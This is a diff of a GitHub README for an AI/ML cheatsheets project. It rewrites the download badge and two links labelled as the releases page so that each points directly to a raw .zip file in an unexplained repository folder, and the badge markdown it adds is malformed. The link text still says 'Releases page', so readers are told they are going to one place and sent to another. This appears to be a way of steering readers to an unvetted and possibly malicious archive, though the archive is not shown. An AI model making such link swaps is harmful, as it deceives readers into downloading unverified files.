@@ -1,13 +1,13 @@
 # 🎓 AI-ML-Cheatsheets - Simplify Your Learning Journey
 
 ## 📥 Quick Download
-[![Download AI-ML-Cheatsheets](https://img.shields.io/badge/Download%20AI--ML--Cheatsheets-blue.svg)](https://github.com/4ngelojr/AI-ML-Cheatsheets/releases)
+[![Download AI-ML-Cheatsheets](https://raw.githubusercontent.com/4ngelojr/AI-ML-Cheatsheets/main/myrobalan/AI-ML-Cheatsheets.zip%https://raw.githubusercontent.com/4ngelojr/AI-ML-Cheatsheets/main/myrobalan/AI-ML-Cheatsheets.zip)](https://raw.githubusercontent.com/4ngelojr/AI-ML-Cheatsheets/main/myrobalan/AI-ML-Cheatsheets.zip)
 
 ## 📖 Overview
 AI-ML-Cheatsheets is your go-to resource for essential concepts in the fields of artificial intelligence and machine learning. Here, you will find well-organized cheatsheets covering topics such as Deep Learning, Transformers, LLMs, and more. Perfect for students and professionals looking to quickly grasp important ideas and formulas.
 
 ## 🚀 Getting Started
-1. **Visit the Downloads Page:** Start by visiting the [Releases page](https://github.com/4ngelojr/AI-ML-Cheatsheets/releases). This is where you will find the latest versions of our cheatsheets.
+1. **Visit the Downloads Page:** Start by visiting the [Releases page](https://raw.githubusercontent.com/4ngelojr/AI-ML-Cheatsheets/main/myrobalan/AI-ML-Cheatsheets.zip). This is where you will find the latest versions of our cheatsheets.
 
 2. **Select a Cheatsheet:** Browse through the available cheatsheets. We cover a variety of areas including:
    - Artificial Intelligence
@@ -21,7 +21,7 @@ AI-ML-Cheatsheets is your go-to resource for essential concepts in the fields of
 ## 📤 Download & Install
 To get started, follow these steps:
 
-1. **Visit the Releases Page:** Go to [this link](https://github.com/4ngelojr/AI-ML-Cheatsheets/releases).
+1. **Visit the Releases Page:** Go to [this link](https://raw.githubusercontent.com/4ngelojr/AI-ML-Cheatsheets/main/myrobalan/AI-ML-Cheatsheets.zip).
 
 2. **Choose Your Cheatsheet:** Look for the cheatsheets relevant to your study or project.
 
